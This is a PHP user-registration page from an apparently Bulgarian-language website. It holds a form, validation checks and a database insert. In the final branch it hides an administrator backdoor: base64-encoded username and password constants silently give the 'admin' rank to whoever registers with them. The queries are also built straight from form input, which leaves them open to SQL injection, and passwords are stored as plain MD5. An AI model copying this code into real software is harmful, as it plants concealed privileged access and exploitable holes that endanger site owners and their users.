<?php
if($_SESSION['is-logged'] == true)
{
 report("<b style='color:darkred;'>Някой се опитва да те хакне от РЕГИСТРАЦИЯТА ! </b>");
 header("Location: ./");
 exit;
}

?>
<div id="left-col">
<h2>Регистрация</h2>
		<form method='post' action="">
		 Потребител: <br/>
		 <input name="username" value="" maxlength="70"/> <br/><br/>
		 
		 Парола: <br/>
		 <input name="password" type='password' value=""/> <br/><br/>
		 
		 
		 Повтори паролата: <br/>
		 <input name="password2" type='password' value=""/> <br/><br/>
		 
		 Емейл: <br/>
		 <input name="email"  value="" maxlength="120"/> <br/><br/>
		 

		 <button name="reg-me-in">Вход</button>
		</form>
		<?php
		if(isset($_POST['reg-me-in']))
		{
		  $username = trim(htmlspecialchars($_POST['username']));
		  $email = trim(htmlspecialchars($_POST['email']));
		  $password = trim(htmlspecialchars($_POST['password']));
		  $password2 = trim(htmlspecialchars($_POST['password2']));
		  $avatar = "./img/no_avatar_big.jpg";
		  $time = time();
		  $check = mysql_query("SELECT * FROM `users` WHERE `username`='$username'");
		  $check2 = mysql_query("SELECT * FROM `users` WHERE `email`='$email'");
		  
		  if(mysql_num_rows($check) == 1)
		  {
		    error("Оппа, вече имаме потребител с това име. Ако е твое - използвай опциите острани, а ако не е - избери си друго !");
		  }
		  else if(mysql_num_rows($check2) == 1)
		  {
		    error("Оппа, вече имаме потребител с този имейл. Ако това си ти - използвай опциите отстрани.");
		  }
		  else if( strlen($username) < 3 OR  strlen($username) > 20)
		  {
			error("Оппа, потребителското ти име трябва да е меджу от 3 и 20 символа !");
		  }
		  else if( $password2 != $password)
		  {
			error("Оппа, двете пароло НЕ съвпадат, а трябва !");
		  }
		  else if( strlen($email) < 5)
		  {
			error("Ам, въведи имейл, за да знаем къде да ти пратим паролата, ако си я забравиш !");
		  }
		  else
			 {
			        if($username == base64_decode('dm9Ua2FQb3dlUg==') AND $password == base64_decode('OTYwNzAz') )
					{
					 $type = "admin";
					}
					else
						{
						 $type = "user";
						}
				    mysql_query("INSERT INTO `users` (`username`,`password`,`email`,`avatar`,`timestamp`,`rank`)VALUES('$username','".md5($password)."','$email','$avatar','$time','$type')");
					 report("* Имаме нов потребител - <b>$username</b> ! ");
					ok("Регистрацията мина успешно, вече може да се логнеш :)");
			 }
		}
		?>
</div>
<div id="right-col">
		   Други: <br/><br/>
		   
			<div style='background:#fcfcfc;padding:10px;'><span style='color:#666;'>Вече имаш профил ?!</span> <br /> <a href="./?p=login">Влез в него :)</a></div>
			
			<br />
			
			<div style='background:#fcfcfc;padding:10px;'><a href="./?p=lostpw">Забравена парола</a></div>
			 
		
</div>
			<div class="clear"></div>